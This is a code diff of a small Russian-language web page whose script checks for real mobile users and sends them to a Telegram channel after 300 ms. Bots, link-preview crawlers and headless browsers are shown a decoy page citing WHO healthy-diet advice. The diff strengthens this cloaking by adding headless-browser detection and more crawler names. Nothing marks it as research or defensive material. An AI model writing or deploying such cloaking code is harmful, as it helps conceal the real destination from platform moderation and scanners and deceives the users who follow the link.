@@ -1,35 +1,25 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Загрузка...</title>
-  <script>
-    const isRealUser = () => {
-      const ua = navigator.userAgent.toLowerCase();
-      const widthCheck = screen.width > 320;
-      const pluginsCheck = navigator.plugins.length > 0;
-      const notBot = !/bot|crawl|spider|facebook|preview|google|whatsapp|telegram|vk/.test(ua);
-      const isMobile = /android|iphone|ipad|ipod|mobile/i.test(ua);
-      const hasTouch = 'ontouchstart' in window;
+<script>
+  const isRealUser = () => {
+    const ua = navigator.userAgent.toLowerCase();
+    const isMobile = /android|iphone|ipad|ipod|mobile/i.test(ua);
+    const isBot = /bot|crawler|spider|facebook|preview|google|yandex|vkshare/i.test(ua);
+    const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+    const isHeadless = navigator.webdriver;
 
-      return widthCheck && pluginsCheck && isMobile && notBot && hasTouch;
-    };
+    return isMobile && hasTouch && !isBot && !isHeadless;
+  };
 
-    if (isRealUser()) {
-      setTimeout(() => {
-        window.location.replace("https://t.me/paradise_opt");
-      }, 300);
-    } else {
-      document.write(`
-        <h1>Здоровое питание</h1>
-        <p>Официальные рекомендации по питанию от ВОЗ:</p>
-        <a href="https://www.who.int/ru/news-room/fact-sheets/detail/healthy-diet" target="_blank">
-          https://www.who.int/ru/news-room/fact-sheets/detail/healthy-diet
-        </a>
-      `);
-    }
-  </script>
-</head>
-<body></body>
-</html>
+  if (isRealUser()) {
+    setTimeout(() => {
+      window.location.href = "https://t.me/paradise_opt";
+    }, 300);
+  } else {
+    document.write(`
+      <h1>Здоровое питание</h1>
+      <p>Официальные рекомендации по питанию от ВОЗ:</p>
+      <a href="https://www.who.int/ru/news-room/fact-sheets/detail/healthy-diet" target="_blank">
+        https://www.who.int/ru/news-room/fact-sheets/detail/healthy-diet
+      </a>
+    `);
+  }
+</script>
